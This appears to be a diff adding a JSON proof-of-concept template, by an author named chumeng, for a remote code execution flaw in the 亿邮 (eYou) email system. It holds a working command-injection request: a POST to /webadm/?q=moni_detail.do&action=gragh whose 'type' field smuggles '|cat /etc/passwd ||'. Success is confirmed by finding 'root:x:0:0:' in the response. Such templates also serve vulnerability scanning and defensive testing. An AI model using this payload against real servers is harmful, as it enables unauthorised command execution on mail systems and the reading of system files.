@@ -1,0 +1,34 @@
+{
+    "Name": "亿邮电子邮件系统RCE漏洞",
+    "Description": "亿邮电子邮件系统RCE漏洞",
+    "Product": "亿邮",
+    "author": "chumeng",
+    "Request":[
+                {
+        "Method": "POST",
+        "Header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+            "Content-Type":"application/x-www-form-urlencoded"},
+        "Uri":"/webadm/?q=moni_detail.do&action=gragh",
+        "Port":"",
+        "Data":"type='|cat /etc/passwd ||'",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "root:x:0:0:"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
